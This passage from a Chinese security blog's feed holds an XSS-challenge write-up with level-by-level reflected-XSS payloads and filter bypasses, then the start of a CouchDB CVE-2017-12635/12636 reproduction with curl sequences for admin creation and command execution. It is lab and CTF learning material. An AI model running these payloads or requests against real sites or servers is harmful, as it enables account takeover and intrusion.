class="line">script</span><br><span class="line">href</span><br><span class="line">oninput</span><br><span class="line">&quot;&apos;%&amp;#&gt;&lt;/script&gt;&lt;p class=&quot;onmouseover=&quot; onmouseover=&quot;xx&quot; onxxx=&quot;&quot;&gt;location_beacon&lt;/p&gt;</span><br><span class="line">&apos; &quot;&gt;&lt;img src=x onerror=alert(2) x=</span><br></pre></td></tr></table></figure><p>构造标签</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">test&quot;&gt;&lt;script&gt;confirm(&quot;XssHere&quot;)&lt;/script&gt;</span><br><span class="line">test&quot;&gt;&lt;script&gt;prompt(&quot;XssHere&quot;)&lt;/script&gt;</span><br><span class="line">test&quot;&gt;&lt;script&gt;alert(&quot;XssHere&quot;)&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>输入点位于属性内，基于事件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&apos; oninput=alert`1` //</span><br><span class="line">&apos; oninput=alert`1` &apos;</span><br><span class="line">&apos; onchange=alert`1` //</span><br><span class="line">&apos; onchange=alert`1` &apos;</span><br></pre></td></tr></table></figure><p>输入点位于属性内， 截断属性，构造标签(script标签 或者 a标签)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&quot;&gt; &lt;a href=&quot;javascript:%61lert(1)&quot;&gt;click me&lt;/a&gt; //</span><br><span class="line">&quot;&gt; &lt;a href=&quot;javascript:alert(&apos;xss&apos;)&quot;&gt;111&lt;/a&gt; //</span><br><span class="line">&quot;&gt; &lt;a href=&quot;javascript:alert(/1/)&quot;&gt;axxx&lt;/a&gt; //</span><br></pre></td></tr></table></figure><h3 id="0x01"><a href="#0x01" class="headerlink" title="0x01"></a>0x01</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?name=&lt;script&gt;alert(1)&lt;/script&gt;</span><br></pre></td></tr></table></figure><h3 id="0x02"><a href="#0x02" class="headerlink" title="0x02"></a>0x02</h3><p>先测试一下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?keyword=&lt;script&gt;alter(1)&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>没反应，查看下源代码</p><p><img src="https://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/WriteUP/XSSTV%E6%8C%91%E6%88%98%E8%B5%9B/1531185966173.png" alt="1531185966173"></p><p>有两个输出点，h2标签转义了 <code>&lt; ，&gt;</code> 但是下面的input没有过滤</p><p><code>&gt;</code>闭合了input标签，然后加了一个能触发alert的属性就行了。 </p><p>payload</p><blockquote><p>onchange=alert(1)&gt;</p></blockquote><p>弹出成功后查看一下源代码，觉得有点不对劲</p><p><img src="https://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/WriteUP/XSSTV%E6%8C%91%E6%88%98%E8%B5%9B/1531186231555.png" alt="1531186231555"></p><p>加上双引号闭合，但是没有弹出,发现后面有个 <code>&quot;&gt;</code>，用br闭合一下</p><blockquote><p>“onchange=alert(1)&gt;</p></blockquote><p><img src="https://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/WriteUP/XSSTV%E6%8C%91%E6%88%98%E8%B5%9B/1531187914573.png" alt="1531187914573"></p><blockquote><p>“onchange=alert(1)&gt; &lt;br “=</p></blockquote><p><img src="https://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/WriteUP/XSSTV%E6%8C%91%E6%88%98%E8%B5%9B/1531210310583.png" alt="1531210310583"></p><h3 id="0x03"><a href="#0x03" class="headerlink" title="0x03"></a>0x03</h3><p><img src="https://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/WriteUP/XSSTV%E6%8C%91%E6%88%98%E8%B5%9B/1531188126212.png" alt="1531188126212"></p><p>两个输出点都转义了<code>&gt; &lt;</code>，</p><p>跟第二关一样试试加属性</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&apos;onchange=alert(1)</span><br></pre></td></tr></table></figure><p>发现不知道为啥多了个单引号，闭合一下</p><p><img src="https://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/WriteUP/XSSTV%E6%8C%91%E6%88%98%E8%B5%9B/1531188797086.png" alt="1531188797086"></p><p>done</p><p><img src="https://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/WriteUP/XSSTV%E6%8C%91%E6%88%98%E8%B5%9B/1531210569856.png" alt="1531210569856"></p><p>payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&apos;onchange=alert(1) &apos;=&quot;</span><br></pre></td></tr></table></figure><h3 id="0x04"><a href="#0x04" class="headerlink" title="0x04"></a>0x04</h3><p>payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;onchange=alert(1) &apos;=&apos;</span><br></pre></td></tr></table></figure><p><img src="https://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/WriteUP/XSSTV%E6%8C%91%E6%88%98%E8%B5%9B/1531189584721.png" alt="1531189584721"></p><h3 id="0x05"><a href="#0x05" class="headerlink" title="0x05"></a>0x05</h3><p>都被安排上了，插入了一个<code>_</code></p><p><img src="https://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/WriteUP/XSSTV%E6%8C%91%E6%88%98%E8%B5%9B/1531190264025.png" alt="1531190264025"></p><p><img src="https://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/WriteUP/XSSTV%E6%8C%91%E6%88%98%E8%B5%9B/1531190312735.png" alt="1531190312735"></p><p>试试expression</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;&gt;&lt;img style=&quot;xss:expression(alert)&quot;&gt;</span><br></pre></td></tr></table></figure><p><img src="https://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/WriteUP/XSSTV%E6%8C%91%E6%88%98%E8%B5%9B/1531190498640.png" alt="1531190498640"></p><p>再试试href</p><p><img src="https://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/WriteUP/XSSTV%E6%8C%91%E6%88%98%E8%B5%9B/1531190680844.png" alt="1531190680844"></p><p>后面多了个 <code>&quot;&gt;</code>  ，继续加个标签闭合一下</p><p><img src="https://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/WriteUP/XSSTV%E6%8C%91%E6%88%98%E8%B5%9B/1531191833992.png" alt="1531191833992"> </p><p>payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;&gt; &lt;a href=&quot;javascript:alert(1)&quot;&gt;click me&lt;/a&gt;&lt;br &quot;=</span><br></pre></td></tr></table></figure><h3 id="0x06"><a href="#0x06" class="headerlink" title="0x06"></a>0x06</h3><p>此处的防御大概如下</p><p> href 转换为 <code>hr_ef</code> </p><p>on 替换为 <code>o_n</code> </p><p>然而只要切换大小写就可以绕过转换。 </p><p>payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;&gt; &lt;a Href=&quot;javascript:alert(1)&quot;&gt;click me&lt;/a&gt;</span><br></pre></td></tr></table></figure><h3 id="0x07"><a href="#0x07" class="headerlink" title="0x07"></a>0x07</h3><p>script被删掉，试一下双写</p><p><img src="https://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/WriteUP/XSSTV%E6%8C%91%E6%88%98%E8%B5%9B/1531192980682.png" alt="1531192980682"></p><p><img src="https://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/WriteUP/XSSTV%E6%8C%91%E6%88%98%E8%B5%9B/1531192933603.png" alt="1531192933603"></p><p>payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;&gt;&lt;sscriptcript&gt;alert(1)&lt;/sscriptcript&gt;</span><br></pre></td></tr></table></figure><h3 id="0x08"><a href="#0x08" class="headerlink" title="0x08"></a>0x08</h3><p>javascript  加了个 <code>_</code> ，使用HTML实体字符绕过</p><p> HTML16编码 </p><p>HTML10编码 </p><p><img src="https://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/WriteUP/XSSTV%E6%8C%91%E6%88%98%E8%B5%9B/1531193524450.png" alt="1531193524450"></p><p>输入之后点一下友情链接</p><p>payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">javasc&amp;#x0072;ipt:alert(1)</span><br><span class="line">javasc&amp;#x0072;ipt:alert`1`</span><br></pre></td></tr></table></figure><h3 id="0x09"><a href="#0x09" class="headerlink" title="0x09"></a>0x09</h3><p>刚开始以为只有input一个输出点（其实input根本不是输出点），href才是真的输出点，后来发现是要加上 http，要不然检测为不合法链接不给过</p><p><img src="https://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/WriteUP/XSSTV%E6%8C%91%E6%88%98%E8%B5%9B/1531197569667.png" alt="1531197569667"></p><p><img src="https://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/WriteUP/XSSTV%E6%8C%91%E6%88%98%E8%B5%9B/1531197938265.png" alt="1531197938265"></p><p>payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">javasc&amp;#x72;ipt:alert(1)//http://blog</span><br></pre></td></tr></table></figure><h3 id="0xA"><a href="#0xA" class="headerlink" title="0xA"></a>0xA</h3><p>查看源代码发现有hidden，肯定有问题，一个一个试着能不能注入，发现t_sort可以传入参数</p><p><img src="https://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/WriteUP/XSSTV%E6%8C%91%E6%88%98%E8%B5%9B/1531200156204.png" alt="1531200156204"></p><p>payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?t_link=&amp;t_history=&amp;t_sort=&quot; type=&quot;text&quot; onmouseover=alert`1` &quot;</span><br><span class="line">?t_link=&amp;t_history=&amp;t_sort=&quot; onclick=alert(0) type=&quot;submit&quot;</span><br></pre></td></tr></table></figure><h3 id="0xB"><a href="#0xB" class="headerlink" title="0xB"></a>0xB</h3><p>把input标签的hidden改为text，在出现的文本框随便输入，回车发现 t_ref 被传入值，查看网络发现</p><p>这个值就是请求头的referer</p><p><img src="https://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/WriteUP/XSSTV%E6%8C%91%E6%88%98%E8%B5%9B/1531202233456.png" alt="1531202233456"></p><p><img src="https://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/WriteUP/XSSTV%E6%8C%91%E6%88%98%E8%B5%9B/1531202956515.png" alt="1531202956515"></p><p><img src="https://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/WriteUP/XSSTV%E6%8C%91%E6%88%98%E8%B5%9B/1531202795820.png" alt="1531202795820"></p><p><img src="https://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/WriteUP/XSSTV%E6%8C%91%E6%88%98%E8%B5%9B/1531202818908.png" alt="1531202818908"></p><p>firefox直接改不能在页面看出效果，burpsuite改一改</p><p><img src="https://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/WriteUP/XSSTV%E6%8C%91%E6%88%98%E8%B5%9B/1531203705589.png" alt="1531203705589"></p><p><img src="https://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/WriteUP/XSSTV%E6%8C%91%E6%88%98%E8%B5%9B/1531203630224.png" alt="1531203630224"></p><h3 id="0xC"><a href="#0xC" class="headerlink" title="0xC"></a>0xC</h3><p>传user-agent的值</p><p><img src="https://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/WriteUP/XSSTV%E6%8C%91%E6%88%98%E8%B5%9B/1531203770013.png" alt="1531203770013"></p><p>burpsuite改一改</p><p><img src="https://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/WriteUP/XSSTV%E6%8C%91%E6%88%98%E8%B5%9B/1531203852396.png" alt="1531203852396"></p><p><img src="https://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/WriteUP/XSSTV%E6%8C%91%E6%88%98%E8%B5%9B/1531203895448.png" alt="1531203895448"></p><h3 id="0xD"><a href="#0xD" class="headerlink" title="0xD"></a>0xD</h3><p><img src="https://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/WriteUP/XSSTV%E6%8C%91%E6%88%98%E8%B5%9B/1531204005063.png" alt="1531204005063"></p><p>抓个包 ，发现是Cookie的user，改一改</p><p><img src="https://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/WriteUP/XSSTV%E6%8C%91%E6%88%98%E8%B5%9B/1531204040196.png" alt="1531204040196"></p><p><img src="https://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/WriteUP/XSSTV%E6%8C%91%E6%88%98%E8%B5%9B/1531204784499.png" alt="1531204784499"></p><h3 id="0xE"><a href="#0xE" class="headerlink" title="0xE"></a>0xE</h3><p>需要登录</p><h3 id="0xF"><a href="#0xF" class="headerlink" title="0xF"></a>0xF</h3><p>注意： 需要科学上网，因为<code>angular.min.js</code> 是用google的api引入</p><p>涉及到<code>AngularJS</code></p><p>简单来说，AngularJS 通过新的属性和表达式扩展了 HTML</p><p>源码中的<code>ng-include</code>即包含外部的 HTML 文件，文件名来自<code>src</code>参数，包含的内容将作为指定元素的子节点。</p><p>由于ng-include遵循SOP，所以我们可以选择包level 1：</p><p><img src="https://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/WriteUP/XSSTV%E6%8C%91%E6%88%98%E8%B5%9B/1531207476180.png" alt="1531207476180"></p><p>payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">src=&apos;level1.php?name=&lt;img src=x onerror=alert(1)&gt;&apos;</span><br></pre></td></tr></table></figure><h3 id="0x10"><a href="#0x10" class="headerlink" title="0x10"></a>0x10</h3><p>直接把keyword的值输出到center标签，构造一个标签</p><p>script被过滤，用on事件代替 </p><p>空格被转义，用<code>%0a</code>代替空格</p><p><img src="https://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/WriteUP/XSSTV%E6%8C%91%E6%88%98%E8%B5%9B/1531208478885.png" alt="1531208478885"></p><p>点图片上面一点的灰色</p><p><img src="https://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/WriteUP/XSSTV%E6%8C%91%E6%88%98%E8%B5%9B/1531208500975.png" alt="1531208500975"></p><p><img src="https://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/WriteUP/XSSTV%E6%8C%91%E6%88%98%E8%B5%9B/1531208609687.png" alt="1531208609687"></p><p>payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;button%0Aonclick=alert()&gt;</span><br><span class="line">?keyword=%3Cimg%0asrc=xss%0aonerror=%27alert(1)%27%3E</span><br><span class="line">?keyword=&lt;img%0Asrc=&quot;xss&quot;%0Aonerror=alert()&gt;</span><br></pre></td></tr></table></figure><h3 id="0x11"><a href="#0x11" class="headerlink" title="0x11"></a>0x11</h3><p>传点参数进去，会显示在embed标签里</p><p><img src="https://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/WriteUP/XSSTV%E6%8C%91%E6%88%98%E8%B5%9B/1531210054079.png" alt="1531210054079"></p><p>在firefox上启动不了flash，就在chrome试了</p><p><img src="https://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/WriteUP/XSSTV%E6%8C%91%E6%88%98%E8%B5%9B/1531209510868.png" alt="1531209510868"></p><p>payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?arg01=a&amp;arg02= onmouseover=alert(1)</span><br></pre></td></tr></table></figure><h3 id="0x12"><a href="#0x12" class="headerlink" title="0x12"></a>0x12</h3><p><img src="https://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/WriteUP/XSSTV%E6%8C%91%E6%88%98%E8%B5%9B/1531210036324.png" alt="1531210036324"></p><p><img src="https://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/WriteUP/XSSTV%E6%8C%91%E6%88%98%E8%B5%9B/1531209690116.png" alt="1531209690116"></p><p>payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?arg01=a&amp;arg02= onmouseover=alert(1)</span><br></pre></td></tr></table></figure><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>反射型XSS用途已经不那么大了，如果payload在url中很容易被chrome xss auditor拦截 </p><p>所以才用firefox</p><h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><p><a href="http://blkstone.github.io/2017/06/08/xss-challenge/" target="_blank" rel="noopener">http://blkstone.github.io/2017/06/08/xss-challenge/</a></p><p><a href="https://www.cnblogs.com/r00tuser/p/7407459.html" target="_blank" rel="noopener">https://www.cnblogs.com/r00tuser/p/7407459.html</a></p><p><a href="https://zhuanlan.zhihu.com/p/29866236" target="_blank" rel="noopener">https://zhuanlan.zhihu.com/p/29866236</a></p><p><a href="https://www.tr0y.wang/2018/04/10/XSSLoad/" target="_blank" rel="noopener">https://www.tr0y.wang/2018/04/10/XSSLoad/</a></p><p><a href="http://www.fooying.com/the-art-of-xss-1-introduction/" target="_blank" rel="noopener">http://www.fooying.com/the-art-of-xss-1-introduction/</a></p><p><a href="http://shaobaobaoer.cn/archives/603/xss-%E6%8C%91%E6%88%98%E8%B5%9B-wp-%E4%B8%8A（调皮的shaobaobaoer）" target="_blank" rel="noopener">http://shaobaobaoer.cn/archives/603/xss-%E6%8C%91%E6%88%98%E8%B5%9B-wp-%E4%B8%8A（调皮的shaobaobaoer）</a></p><p><a href="https://brutelogic.com.br/blog/（very" target="_blank" rel="noopener">https://brutelogic.com.br/blog/（very</a> good）</p><p><a href="https://wps2015.org/drops/drops/xss%E6%8C%91%E6%88%98%E8%B5%9Bwriteup.html" target="_blank" rel="noopener">https://wps2015.org/drops/drops/xss%E6%8C%91%E6%88%98%E8%B5%9Bwriteup.html</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;img src=&quot;https://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/WriteUP/XSSTV%E6%8C%91%E6%88%98%E8%B5%9B/index.png&quot; alt=&quot;img&quot;&gt; &lt;/p&gt;
&lt;h3 id=&quot;靶场&quot;&gt;&lt;a href=&quot;#靶场&quot; class=&quot;headerlink&quot; title=&quot;靶场&quot;&gt;&lt;/a&gt;靶场&lt;/h3&gt;&lt;p&gt;​    &lt;a href=&quot;http://test.xss.tv&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;http://test.xss.tv&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;​    也可以自己搭在本地搭建&lt;/p&gt;
&lt;p&gt;​    链接: &lt;a href=&quot;https://pan.baidu.com/s/1xEZl3OiBw1l_goWzrbf4tw&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://pan.baidu.com/s/1xEZl3OiBw1l_goWzrbf4tw&lt;/a&gt; 密码: akvp&lt;/p&gt;
&lt;h3 id=&quot;工具：&quot;&gt;&lt;a href=&quot;#工具：&quot; class=&quot;headerlink&quot; title=&quot;工具：&quot;&gt;&lt;/a&gt;工具：&lt;/h3&gt;&lt;p&gt;​    firefox   61版本&lt;/p&gt;
&lt;p&gt;​    chrome 67版本&lt;/p&gt;
&lt;p&gt;​    burpsuite&lt;/p&gt;
    
    </summary>
    
      <category term="Web安全" scheme="http://blog.Lhaihai.wang/categories/Web%E5%AE%89%E5%85%A8/"/>
    
      <category term="XSS" scheme="http://blog.Lhaihai.wang/categories/Web%E5%AE%89%E5%85%A8/XSS/"/>
    
    
      <category term="XSS" scheme="http://blog.Lhaihai.wang/tags/XSS/"/>
    
  </entry>
  
  <entry>
    <title>CouchDB的两个CVE复现</title>
    <link href="http://blog.Lhaihai.wang/2018/07/09/CouchDB%E7%9A%84%E4%B8%A4%E4%B8%AACVE%E5%A4%8D%E7%8E%B0/"/>
    <id>http://blog.Lhaihai.wang/2018/07/09/CouchDB的两个CVE复现/</id>
    <published>2018-07-09T05:57:06.000Z</published>
    <updated>2018-07-09T05:57:07.856Z</updated>
    
    <content type="html"><![CDATA[<p>复现地址：</p><p><a href="http://vulhub.org/#/environments/couchdb/CVE-2017-12635/" target="_blank" rel="noopener">http://vulhub.org/#/environments/couchdb/CVE-2017-12635/</a></p><p><a href="http://vulhub.org/#/environments/couchdb/CVE-2017-12636/" target="_blank" rel="noopener">http://vulhub.org/#/environments/couchdb/CVE-2017-12636/</a></p><p>i春秋有实验，不用自己搭，但是慢。I春秋的实验指导还是可以看一下的</p><p><a href="https://www.ichunqiu.com/course/60383" target="_blank" rel="noopener">https://www.ichunqiu.com/course/60383</a></p><h3 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h3><hr><p>Apache CouchDB是一个开源数据库，专注于易用性和成为”完全拥抱web的数据库”。它是一个使用JSON作为存储格式，JavaScript作为查询语言，MapReduce和HTTP作为API的NoSQL数据库。应用广泛，如BBC用在其动态内容展示平台，Credit Suisse用在其内部的商品部门的市场框架，Meebo，用在其社交平台（web和应用程序）。</p><a id="more"></a><h3 id="漏洞概述"><a href="#漏洞概述" class="headerlink" title="漏洞概述"></a>漏洞概述</h3><hr><p>CVE-2017-12635是由于Erlang和JavaScript对JSON解析方式的不同，导致语句执行产生差异性导致的。这个漏洞可以让任意用户创建管理员，属于垂直权限绕过漏洞。 </p><p>CVE-2017-12636是一个任意命令执行漏洞，我们可以通过config api修改couchdb的配置<code>query_server</code>，这个配置项在设计、执行view的时候将被运行。 </p><p>影响版本：小于 1.7.0 以及 小于 2.1.1 </p><h3 id="Couchdb-垂直权限绕过漏洞（CVE-2017-12635）"><a href="#Couchdb-垂直权限绕过漏洞（CVE-2017-12635）" class="headerlink" title="Couchdb 垂直权限绕过漏洞（CVE-2017-12635）"></a>Couchdb 垂直权限绕过漏洞（CVE-2017-12635）</h3><hr><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -X PUT -d &apos;&#123;&quot;type&quot;:&quot;user&quot;,&quot;name&quot;:&quot;vulhub&quot;,&quot;roles&quot;:[&quot;_admin&quot;],&quot;roles&quot;:[],&quot;password&quot;:&quot;123456&quot;&#125;&apos; 192.168.190.128:5984/_users/org.couchdb.user:vulhub -H &quot;Content-Type:application/json&quot;</span><br></pre></td></tr></table></figure><p><img src="https://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/WriteUP/couchdb/1531041179054.png" alt="1531041179054"></p><p><img src="https://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/WriteUP/couchdb/1531041197097.png" alt="1531041197097"></p><h3 id="Couchdb-任意命令执行漏洞（CVE-2017-12636）"><a href="#Couchdb-任意命令执行漏洞（CVE-2017-12636）" class="headerlink" title="Couchdb 任意命令执行漏洞（CVE-2017-12636）"></a>Couchdb 任意命令执行漏洞（CVE-2017-12636）</h3><hr><p>CVE-2017-12636漏洞在于CouchDB自身的设计问题，CouchDB在<code>query_server</code>中引入了外部的二进制程序来执行命令，我们可以通过CouchDB自身提供的<code>Restful API</code>接口动态修改保存配置，从而执行系统命令 </p><h4 id="Couchdb-1-6-0环境："><a href="#Couchdb-1-6-0环境：" class="headerlink" title="Couchdb 1.6.0环境："></a>Couchdb 1.6.0环境：</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">curl -X PUT &apos;http://vulhub:vulhub@192.168.190.128:5984/_config/query_servers/cmd&apos; -d &apos;&quot;id &gt;/tmp/success&quot;&apos;</span><br><span class="line">curl -X PUT &apos;http://vulhub:vulhub@192.168.190.128:5984/vultest&apos;</span><br><span class="line">curl -X PUT &apos;http://vulhub:vulhub@192.168.190.128:5984/vultest/vul&apos; -d &apos;&#123;&quot;_id&quot;:&quot;770895a97726d5ca6d70a22173005c7b&quot;&#125;&apos;</span><br><span class="line">curl -X POST &apos;http://vulhub:vulhub@192.168.190.128:5984/vultest/_temp_view?limit=10&apos; -d &apos;&#123;&quot;language&quot;:&quot;cmd&quot;,&quot;map&quot;:&quot;&quot;&#125;&apos; -H &apos;Content-Type:application/json&apos;</span><br></pre></td></tr></table></figure><p>其中,<code>vulhub:vulhub</code>为管理员账号密码。</p><p>第一个请求是添加一个名字为<code>cmd</code>的<code>query_servers</code>，其值为<code>&quot;id &gt;/tmp/success&quot;</code>，这就是我们后面待执行的命令。</p><p>第二、三个请求是添加一个Database和Document，这里添加了后面才能查询。</p><p>第四个请求就是在这个Database里进行查询，因为我将language设置为<code>cmd</code>，这里就会用到我第一步里添加的名为<code>cmd</code>的<code>query_servers</code>，最后触发命令执行。</p><p><img src="https://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/WriteUP/couchdb/1531102040955.png" alt="1531102040955"></p><h4 id="Couchdb-2-1-0环境："><a href="#Couchdb-2-1-0环境：" class="headerlink" title="Couchdb 2.1.0环境："></a>Couchdb 2.1.0环境：</h4><p>启动docker</p><p><img src="https://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/WriteUP/couchdb/1531103581867.png" alt="1531103581867"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">curl http://vulhub:vulhub@your-ip:5984/_membership</span><br><span class="line">curl -X PUT http://vulhub:vulhub@your-ip:5984/_node/nonode@nohost/_config/query_servers/cmd -d &apos;&quot;id &gt;/tmp/success&quot;&apos;</span><br><span class="line">curl -X PUT &apos;http://vulhub:vulhub@your-ip:5984/vultest&apos;</span><br><span class="line">curl -X PUT 